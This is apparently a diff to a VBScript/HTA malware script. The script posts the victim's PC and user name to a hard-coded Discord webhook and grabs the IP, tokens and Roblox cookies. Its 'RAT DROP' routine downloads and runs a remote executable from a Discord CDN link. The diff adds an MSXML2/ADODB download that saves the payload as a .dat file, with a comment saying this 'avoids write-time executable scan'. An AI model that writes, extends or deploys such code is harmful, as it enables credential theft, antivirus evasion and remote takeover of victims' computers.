@@ -18,7 +18,7 @@ RE_WH = "https://discord.com/api/webhooks/1572026526407467079/KUyJrlGn-BaxdIM4Py
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' --- 1. INITIAL GRABS (non-blocking, fast) ---
+' --- 1. INITIAL GRABS (fast) ---
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
 Call IP(WH)
 Call GrabTokens(WH)
@@ -45,7 +45,7 @@ Loop
 
 window.close()
 
-' --- RAT DROP (plain URL) ---
+' --- RAT DROP (HTTP object, no curl) ---
 Sub DropRAT(targetWH, sendRocket)
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1557266192971071579/1572386687181394011/client_1.exe?ex=6afe2eb7&is=6afcdd37&hm=45b391655f98bf6655421b302ad71a84bbefa663119aa5784404b8bcee5c2d9f&"
     
@@ -61,11 +61,30 @@ Sub DropRAT(targetWH, sendRocket)
 
     If fso.FileExists(op) Then fso.DeleteFile op, True
 
-    Dim cCmd : cCmd = "cmd /c curl.exe -s -L --connect-timeout 5 --max-time 30 -o """ & op & """ """ & dl & """"
-    sh.Run cCmd, 0, True
+    ' HTTP object download to .dat first — avoids write-time executable scan
+    Dim datPath : datPath = tPath & "\" & fname & ".dat"
+    If fso.FileExists(datPath) Then fso.DeleteFile datPath, True
 
-    If fso.FileExists(op) Then
-        If fso.GetFile(op).Size > 100000 Then
+    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "GET", dl, False
+    xh.Send
+    Dim ok : ok = False
+    If xh.Status = 200 Then
+        Dim st : Set st = CreateObject("ADODB.Stream")
+        st.Type = 1
+        st.Open
+        st.Write xh.responseBody
+        st.SaveToFile datPath, 2
+        st.Close
+        Set st = Nothing
+        ok = True
+    End If
+    Set xh = Nothing
+
+    If ok And fso.FileExists(datPath) Then
+        If fso.GetFile(datPath).Size > 100000 Then
+            fso.MoveFile datPath, op
             If sendRocket Then Call PostEmbedTo(":white_check_mark: Rat Launched", "Rat Launched", 10181046, targetWH)
             Call RunCmd("""" & op & """")
         End If
@@ -160,7 +179,7 @@ Function GetRobloxCookie()
     GetRobloxCookie = cookie
 End Function
 
-' --- Base64 Decoder (unused now, kept for later) ---
+' --- Base64 Decoder ---
 Function DecodeB64(str)
     Dim xml, elem
     Set xml = CreateObject("MSXML2.DOMDocument")
